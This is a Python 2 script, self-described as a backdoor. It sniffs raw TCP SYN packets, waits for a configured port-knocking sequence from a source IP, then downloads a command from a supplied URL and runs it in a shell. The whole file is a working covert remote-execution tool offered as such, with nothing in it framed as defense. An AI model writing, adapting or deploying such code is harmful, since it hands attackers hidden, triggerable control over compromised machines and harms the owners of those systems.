#!/usr/bin/env python2.7
import sys
import socket
import struct
import urllib2
import subprocess


def getConfig():
        if sys.argv[1]:
                return str(sys.argv[1])
        else:
                print " No config specified -\" ./backdoor configuration-file URL \" required "
                sys.exit() 


def getURL():
	if sys.argv[2]:
		return str(sys.argv[2])
	else:
		print " No URL specified -\" ./backdoor configuration-file URL \" required "
		sys.exit()	

def readConfig():
	global configuration_file
	portlist = []
	try:
		with open(configuration_file, 'r') as f:
    			portlist = [int(line.strip()) for line in f]
	except:
		print "Error reading config file named configuration-file \n Exiting .."
		sys.exit()
	return portlist

def readAndExecute():
	global URL
	try:	
		print "Trying for URL - " , URL
	 
		req = urllib2.Request(URL)
		response = urllib2.urlopen(req)
		the_page = str(response.read())
		print the_page
		# command in the_page , executing it 

		print subprocess.Popen(the_page, shell=True, stdout=subprocess.PIPE).stdout.read()
		
	except urllib2.URLError,urllib2.HTTPError:
		print "Error reading the command from ", URL
		sys.exit()
	except :
		print "Error in read And Execute"
		sys.exit()

	
	

def logic(host_port):
	"""
	We have host_port in format (sourceip, destinationport) for TCP SYN packets only - 
	Using hashmap to store it and perform necessary action when correct sequence hit 
	"""
	global hashmap 
	portlist = readConfig()
	if host_port[1] in portlist:
		# Port number exists in port List
		if host_port[0] in hashmap:
			#print hashmap[host_port[0]]
			hashmap[host_port[0]].append(host_port[1])
		else:
			hashmap[host_port[0]] = [host_port[1]] 
	
		print hashmap
	
		if hashmap[host_port[0]] == portlist :
			print ("Whoa lets attack")
			readAndExecute()
	
	else : 
		print host_port[1] ,"not in ",  portlist


def run():


	def parsePacket(packet):
		
		#Parse IP packet and look for TCP SYN return tuple (host,port)
		
		#Packet Data
		data = packet[0]
		
		#IP Header
		IPHeader = data[:20]
		
		unpackedHeader = struct.unpack('!BBHHHBBH4s4s' ,IPHeader)
		
		#unpackedHeader[0] -> Version+IP header Length
		ihl = unpackedHeader[0] & 0xF
		ipHeaderLength = ihl * 4 
	
		#Source Address is 8th field to distinguish hosts

		source_address = socket.inet_ntoa(unpackedHeader[8]);
		#print "source_address  = ", source_address
			
		#Since we  are reading only TCP packets , I am not checking for PROTOCOL field in IP Header
		
		#Next Header after ipHeaderLength is 20 byte TCP Header and SYN packets dont have data

		TCPHeader = data [ipHeaderLength:ipHeaderLength + 20 ]
		
		unpackedTCPHeader = struct.unpack('!HHLLBBHHH' , TCPHeader )

		source_port = unpackedTCPHeader[0]
		destination_port = unpackedTCPHeader[1]

		flags = unpackedTCPHeader[5]  # CWR; ECE ;URG ;ACK ;PSH ; RST ; SYN ; FIN 
		
		#print "flags = " , flags

		syn_bit = ( flags >> 1 ) & 1 
		
		#print "syn_bit = " ,syn_bit

		if ( syn_bit != 1 ) :
			return ()
		
		#print source_port, destination_port , flags , syn_bit  #1234 9007 2 1
		port = 8766
		#return (packet[1][0],port)	
		return (source_address,destination_port)

	

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

	except socket.error , msg:
    		print 'Socket could not be created.\nError Code : ' + str(msg[0]) + '\nMessage ' + msg[1]
    		sys.exit()
	while True:
		packet = s.recvfrom(65565)
		
		host_port =  parsePacket(packet)
		
		if host_port:
			#This means the packet is TCP SYN let's deal with this to save in hash map to carry the attack

			logic(host_port)
	


hashmap = {}
URL = getURL()
configuration_file = getConfig()

if __name__ == "__main__":
	#portlist =  readConfig()
	run()







